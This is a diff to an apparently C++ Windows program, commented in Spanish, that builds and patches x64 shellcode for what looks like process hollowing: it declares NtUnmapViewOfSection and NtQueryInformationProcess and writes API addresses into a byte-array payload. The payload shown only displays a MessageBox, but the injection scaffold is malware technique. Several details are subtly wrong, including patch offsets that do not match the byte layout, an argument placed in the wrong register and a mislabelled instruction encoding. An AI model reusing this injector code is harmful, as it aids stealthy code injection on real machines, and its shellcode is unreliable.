@@ -17,22 +17,26 @@ typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG,
 typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
 
 unsigned char shellcode[] = {
+    // Calcular dirección base del shellcode
+    0x48, 0x89, 0xC8,               // mov rax, rcx        ; rcx contiene la dirección de entrada
     0x48, 0x31, 0xC9,               // xor rcx, rcx        ; hWnd = NULL
-    0x48, 0x31, 0xD2,               // xor rdx, rdx        ; lpText = NULL (se modificará después)
-    0x49, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r8, 0 (dirección del título)
-    0x49, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r9, 0 (dirección del mensaje)
+    
+    // Calcular dirección del mensaje (rax + 0x3E)
+    0x48, 0x8D, 0x90, 0x3E, 0x00, 0x00, 0x00,   // lea rdx, [rax + 0x3E]
+    
+    // Calcular dirección del título (rax + 0x55)
+    0x49, 0x8D, 0x88, 0x55, 0x00, 0x00, 0x00,   // lea r8, [rax + 0x55]
+    
     0x48, 0x31, 0xF6,               // xor rsi, rsi        ; uType = MB_OK
     
     // Llamar a MessageBoxA
-    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, [MessageBoxA]
-    0x48, 0x8B, 0x00,               // mov rax, [rax]      ; obtener dirección real
-    0xFF, 0xD0,                     // call rax            ; llamar a MessageBoxA
+    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, MessageBoxA
+    0xFF, 0xD0,                     // call rax
     
     // Salir del hilo
     0x48, 0x31, 0xC9,               // xor rcx, rcx        ; ExitCode = 0
-    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, [ExitThread]
-    0x48, 0x8B, 0x00,               // mov rax, [rax]      ; obtener dirección real
-    0xFF, 0xD0,                     // call rax            ; llamar a ExitThread
+    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ExitThread
+    0xFF, 0xD0,                     // call rax
     
     // Datos: Mensaje y Título
     'H', 'o', 'l', 'a', ' ', 'd', 'e', 's', 'd', 'e', ' ', 'e', 'l', ' ', 'p', 'a', 'y', 'l', 'o', 'a', 'd', '!', 0,
@@ -182,14 +186,8 @@ int main() {
         return 1;
     }
     
-    memcpy(shellcode + 0x1C, &pMessageBoxA, sizeof(void*));
-    memcpy(shellcode + 0x35, &pExitThread, sizeof(void*));
-    
-    char* msgAddress = (char*)((DWORD_PTR)shellcode + 0x43);
-    char* titleAddress = (char*)((DWORD_PTR)shellcode + 0x5A);
-    
-    memcpy(shellcode + 0x0E, &msgAddress, sizeof(void*));
-    memcpy(shellcode + 0x18, &titleAddress, sizeof(void*));
+    memcpy(shellcode + 0x2A, &pMessageBoxA, sizeof(void*)); 
+    memcpy(shellcode + 0x37, &pExitThread, sizeof(void*));   
     
     std::cout << "[+] Payload preparado correctamente." << std::endl;
     
